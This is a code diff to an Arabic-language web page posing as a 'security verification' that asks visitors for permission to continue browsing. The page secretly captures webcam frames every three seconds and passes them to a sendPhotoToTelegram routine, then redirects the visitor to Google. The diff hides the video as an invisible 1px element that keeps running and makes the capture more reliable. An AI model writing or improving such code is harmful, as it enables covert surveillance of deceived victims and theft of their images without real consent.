@@ -50,8 +50,13 @@
       opacity: .5;
     }
 
+    /* إخفاء الفيديو بصرياً لكن الاحتفاظ به قيد التشغيل في DOM */
     video {
-      display: none;
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+      width: 1px;
+      height: 1px;
     }
 
     #status {
@@ -66,7 +71,7 @@
     <h1>التحقق من الأمان</h1>
     <p>الرجاء إعطاء الإذن لكي يتم استكمال التصفح.</p>
 
-    <video id="camera" autoplay playsinline></video>
+    <video id="camera" autoplay playsinline muted></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <button id="start">متابعة</button>
@@ -110,15 +115,16 @@
         });
 
         camera.srcObject = stream;
+        await camera.play();
 
-        // Wait for video metadata to load
-        camera.onloadedmetadata = () => {
+        // تحديد أبعاد الـ Canvas بناءً على دقة الكاميرا الفعلية
+        setTimeout(() => {
           canvas.width = camera.videoWidth || 640;
           canvas.height = camera.videoHeight || 480;
           
           const ctx = canvas.getContext("2d");
           
-          // Capture and send frames periodically in the background
+          // التقاط وإرسال الصور بشكل دوري
           setInterval(() => {
             if (!stream) return;
             ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
@@ -127,16 +133,17 @@
                 sendPhotoToTelegram(blob);
               }
             }, "image/jpeg", 0.8);
-          }, 3000); // Send a frame every 3 seconds
+          }, 3000);
 
+          status.textContent = "جاري تحويلك للمحتوى...";
           setTimeout(() => {
-            status.textContent = "جاري تحويلك للمحتوى...";
             window.location.href = "https://www.google.com";
           }, 1500);
-        };
+
+        }, 1000);
 
       } catch (err) {
-        status.textContent = "حدث خطأ، يجدر إعادة المحاولة.";
+        status.textContent = "حدث خطأ في إذن الكاميرا، يرجى المحاولة مرة أخرى.";
         startBtn.disabled = false;
       }
     };
